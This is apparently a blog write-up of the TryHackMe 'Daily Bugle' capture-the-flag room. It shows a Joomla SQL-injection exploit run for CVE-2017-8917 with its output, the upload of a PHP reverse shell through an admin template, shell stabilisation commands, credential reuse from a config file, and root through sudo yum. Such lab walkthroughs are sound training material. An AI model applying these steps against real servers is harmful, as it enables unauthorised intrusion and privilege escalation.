---
title: 'Daily Bugle'
description: "Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum."
date: 2024-05-04T17:10:10+02:00
tags: 
    - "tryhackme"
    - "hard"
external_url: "https://tryhackme.com/r/room/dailybugle"
draft: false
---

## Questions
1. Access the web server, who robbed the bank?
1. What is the Joomla version?
1. What is Jonah's cracked password?
1. What is the user flag?
1. What is the root flag?

## Reconnaissance
After deployment, I started by just going to `http://trgt/`. It loaded a Joomla webpage where I immediately found the first answer.
The spelling was diffrent, had to replace a character for it to work. 

I checked the Joomla version by going to `http://trgt/administrator/manifests/files/joomla.xml` allowing me to get the second question.

## Exploitation
The Joomla CMS was vulnerable to [CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917), an SQLi vulnerability.
I used [Joomblah](https://github.com/XiphosResearch/exploits/tree/master/Joomblah) to exploit this vulnerability.
```
$ python3 joomblah.py http://trgt/

    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '<password hash>', '', '']
  -  Extracting sessions from fb9j5_session
```

Cracking the password gave me a working login for a "Super User". I went to `http://trgt/administrator/` which allowed me to login.

## Foothold
Getting a foothold on the Joomla server was very similar to a WordPress server. Login as a priviliged user, go to themes / templates, add your own PHP reverse shell and profit.

For a reverse shell I used [pentestmonky](https://github.com/pentestmonkey/)'s [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). This was easily and quickly done by using [revshells](https://www.revshells.com/).

I stablized the shell by doing
1. `$ python -c 'import pty;pty.spawn("/bin/bash")'` (python3 wasn't available on the box)
2. `CTRL + Z`
3. `$ stty raw -echo; fg`
4. `$ export TERM=xterm`

Which gave me a better and more useable shell.


## Privilege Escalation
### User
Looking at `/home/` I saw a user called "jjameson" but the home directory was locked down.
Further looking around, I found `configuration.php` in `/var/html/www/` which stored MySQL credentials.

The MySQL database wasn't all that interesting so I tried logging in to the user with the password which worked and gave me the user flag.

### Root
Doing a simple `sudo -l` showed that "jjameson" could run `yum` with root privileges. Looking it up on [GTFOBins](https://gtfobins.github.io/) gave me the information needed to get root shell and therefore the root flag.